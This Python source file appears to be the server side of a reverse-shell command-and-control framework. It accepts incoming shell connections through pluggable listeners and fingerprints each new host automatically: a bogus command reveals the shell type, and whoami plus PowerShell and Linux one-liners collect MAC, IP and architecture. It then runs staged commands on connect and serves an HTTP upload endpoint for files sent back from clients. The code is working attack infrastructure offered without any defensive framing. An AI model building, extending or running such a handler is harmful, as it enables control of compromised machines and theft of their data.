import threading
import time
import core.controller as stages
import datetime
import core.upload as uSrv
from http.server import HTTPServer
from core.printl import *

def ouiSearch(mac:str):

    oui = ''.join(mac.split(":")[:3]).upper()

    if oui.lower() == "ffffff": return "broadcast" 

    with open("./core/ouis.txt", "r", encoding='utf-8') as f:
        for line in f:
            #print(line)
            soui, company = line.strip().split("=", 1)
            if soui == oui:
                return company
            
    return "unknown"

class shellServer:
    def __init__(self, mgrs, skt) -> None:
        self.clients = {}
        self.info = {}
        self.blacklist = []
        self.listeners = {}
        self.mgrs = mgrs

        threading.Thread(target=self.start, daemon=True).start()

    def __detectNew(self, one:dict, two:dict):
        difference = {}

        for key, value in two.items():
            if one.get(key, False):
                continue # similar
            else:
                difference[key] = value # not similar

        for key in difference.copy():
            if key in self.blacklist:
                difference.pop(key)
        
        return difference

    def start(self):
        while True:
            concat = {}

            for name, manager in self.mgrs.modules.items():
                connections = self.mgrs.run(manager["module"], "getConnections")
                listener = self.mgrs.run(manager["module"], "listening")

                self.listeners[name] = {
                    "ip": listener[0],
                    "port": listener[1]
                }

                concat.update(connections)

            newClients = self.__detectNew(self.clients, concat)
            self.clients = concat

            for uuid, value in newClients.items():
                if uuid in self.blacklist: continue
                
                upload.addAuth(uuid)
                self.blacklist.append(uuid)
                threading.Thread(target=self.harvestInfo, args=(uuid, value["run"])).start()

            time.sleep(0.5)

    def runCommand(self, uid, command, _async=False):
        client = self.clients.get(uid)

        if client == None:
            return "Client key \"{}\" is invalid.".format(uid)

        return client["run"](command, uid, _async)
    
    def runStage(self, uid, stage):
        client = self.clients.get(uid)

        if client == None:
            return "Client key \"{}\" is invalid.".format(uid)

        return stages.runStage(stage, client, client["run"])

    
    def harvestInfo(self, uid, sendCmd):
        harvestedInfo = {}
        windows = False

        # harvest info
        shell = sendCmd("fasdsadf", uid, False)
        if "not found" in shell:
            harvestedInfo["shelltype"] = 'bash'
            harvestedInfo["os"] = "Linux"

        elif "as an internal" in shell:
            harvestedInfo["shelltype"] = "command prompt"
            harvestedInfo["os"] = "Windows"
            windows = True

        elif "The term" in shell:
            harvestedInfo["shelltype"] = "powershell"
            harvestedInfo["os"] = "Windows"
            windows = True

        else:
            harvestedInfo["shelltype"] = "???"
            harvestedInfo["os"] = "Linux"

        info("[REMOTE] {} is {}".format(uid, harvestedInfo["shelltype"]))

        # hostname
        harvestedInfo["hostname"] = sendCmd("whoami", uid, False)

        if windows:
            if harvestedInfo["shelltype"] == "powershell":
                harvestedInfo['mac'] = sendCmd("Get-NetAdapter | Where-Object { $_.InterfaceAlias -eq (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceAlias } | Select-Object -ExpandProperty MacAddress", uid, False).replace("-", ":")
                harvestedInfo['ip'] = sendCmd("$mainInterface = (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceIndex; (Get-NetIPAddress | Where-Object { $_.InterfaceIndex -eq $mainInterface -and $_.AddressFamily -eq 'IPv4' }).IPAddress", uid, False)
                harvestedInfo['arch'] = "x86" if sendCmd("(Get-WmiObject -Class Win32_Processor).Architecture", uid, False) == "0" else "x64"
            else:
                harvestedInfo['mac'] = "idk"
                harvestedInfo['ip'] = "idk"
                harvestedInfo['arch'] = "probably x64"
        else:
            harvestedInfo['mac'] = sendCmd("ip -o link | awk '$2 != \"lo:\" {print $2, $(NF-2)}'", uid, False).split("\n")[0].split(": ")[-1]
            harvestedInfo['ip'] = sendCmd("ip route get 1 | awk '{print $NF; exit}'", uid, False)
            harvestedInfo['arch'] = sendCmd("lscpu | awk '/Architecture/ {print $2}'", uid, False)

        harvestedInfo['firstSeen'] = datetime.datetime.now().strftime("%H:%M")
        harvestedInfo['lastActive'] = datetime.datetime.now().strftime("%H:%M")
        harvestedInfo['uid'] = uid
        harvestedInfo['oui'] = ouiSearch(harvestedInfo['mac'])
        harvestedInfo['active'] = True

        self.info[uid] = harvestedInfo
        stages.onConnection(self.info[uid], sendCmd)
    
    def killUID(self, uid):
        self.info.pop(uid)
    
class uploadServer:
    def __init__(self, port=11932, address="0.0.0.0", websock=False) -> None:
        self.port = port
        self.address = address
        if websock: uSrv.websock = websock
        self.server = HTTPServer((self.address, self.port), uSrv.FileUploadHandler)

        self.start()

        info('[UPLOAD] started upload server @ {}:{}'.format(address, port))

    def start(self):
        """
        nonblocking
        """
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        return True
    
    def stop(self):
        return self.server.shutdown()
    
    def removeAuth(self, uid):
        try:
            uSrv.allowedAuth.remove(uid)
            return True
        except ValueError:
            return False
        
    def addAuth(self, uid):
        try:
            uSrv.allowedAuth.append(uid)
            return True
        except:
            return False
        
upload = uploadServer(port=11194) # upload server